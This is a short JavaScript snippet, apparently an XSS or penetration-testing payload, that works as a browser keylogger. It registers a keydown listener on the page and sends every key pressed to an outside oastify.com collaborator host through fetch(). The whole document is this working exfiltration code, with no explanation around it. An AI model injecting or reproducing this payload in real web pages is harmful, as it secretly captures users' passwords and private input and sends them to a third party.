function logKey(event){
	fetch("http://bcrdg18kj6nvnl5gq4ff5t1xgomga5.oastify.com/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);